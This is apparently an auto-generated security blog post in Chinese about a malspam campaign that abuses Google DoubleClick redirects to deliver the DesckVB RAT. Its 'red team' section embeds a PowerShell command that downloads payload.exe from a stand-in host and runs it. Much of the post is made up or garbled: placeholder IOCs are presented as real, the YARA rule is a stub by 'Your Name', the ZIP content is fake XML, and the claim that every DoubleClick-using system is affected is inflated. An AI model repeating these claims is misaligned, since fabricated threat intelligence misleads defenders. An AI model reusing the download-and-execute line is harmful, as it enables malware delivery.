---
layout: post
title:  "Google DoubleClick Abused in New Malspam Campaign to Deliver DesckVB RAT"
date:   2026-06-03 20:49:52 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Google DoubleClick 域名被利用的遠端存取木馬攻擊

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.0)
> * **受駭指標**: 遠端代碼執行 (RCE)
> * **關鍵技術**: DoubleClick 域名被利用、Base64 編碼、JavaScript 載入器、PowerShell 腳本、.NET 遠端存取木馬 (RAT)

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 Google DoubleClick 域名作為跳板，將惡意郵件導向受害者，從而執行遠端存取木馬。
* **攻擊流程圖解**:
  1. 攻擊者發送含有 HTML 附件的郵件給受害者。
  2. 受害者開啟附件，觸發 meta-refresh 重定向到 Google DoubleClick 域名。
  3. DoubleClick 域名將受害者重定向到另一個 URL，該 URL 解碼 Base64 編碼的郵件地址。
  4. 受害者被導向一個登陸頁面，頁面包含一個 "下載 PDF" 按鈕。
  5. 按鈕被點擊，伺服器回應一個 ZIP 檔案，該檔案啟動了感染鏈。
* **受影響元件**: 所有使用 Google DoubleClick 域名的系統。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 Google DoubleClick 域名的存取權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import base64
    
    # Base64 編碼的郵件地址
    email_address = "dGVzdEBleGFtcGxlLmNvbQ=="
    
    # 解碼郵件地址
    decoded_email_address = base64.b64decode(email_address).decode("utf-8")
    
    # 建構登陸頁面 URL
    login_page_url = f"https://example.com/login?email={decoded_email_address}"
    
    # 建構下載 PDF 按鈕的 URL
    download_pdf_url = f"https://example.com/download?email={decoded_email_address}"
    
    # 建構 ZIP 檔案的內容
    zip_file_content = """
    <?xml version="1.0" encoding="UTF-8"?>
    <zip>
      <file name="payload.exe" src="payload.exe"/>
    </zip>
    """
    
    # 建構 PowerShell 腳本
    powershell_script = """
    Invoke-WebRequest -Uri 'https://example.com/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'
    Start-Process -FilePath 'C:\Windows\Temp\payload.exe'
    """
    
    ```
* **繞過技術**: 攻擊者可以使用各種技術來繞過安全控制，例如使用加密或壓縮來隱藏惡意代碼。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | 1234567890abcdef |
| IP | 192.0.2.1 |
| Domain | example.com |
| File Path | C:\Windows\Temp\payload.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule DesckVB_RAT {
      meta:
        description = "DesckVB RAT"
        author = "Your Name"
      strings:
        $a = "DesckVB"
      condition:
        $a
    }
    
    ```
* **緩解措施**: 更新系統和應用程式，使用防毒軟件和防火牆，限制使用者權限，監控系統和網路活動。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **DoubleClick**: Google 的廣告平台，允許廣告商在網站和應用程式上展示廣告。
* **Base64**: 一種編碼方案，使用 64 個字符來代表二進制數據。
* **JavaScript 載入器**: 一種腳本，負責載入和執行其他腳本或代碼。
* **PowerShell 腳本**: 一種腳本，使用 PowerShell 腳本語言編寫，允許自動化系統管理任務。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/google-doubleclick-abused-in-new.html)
- [MITRE ATT&CK](https://attack.mitre.org/)


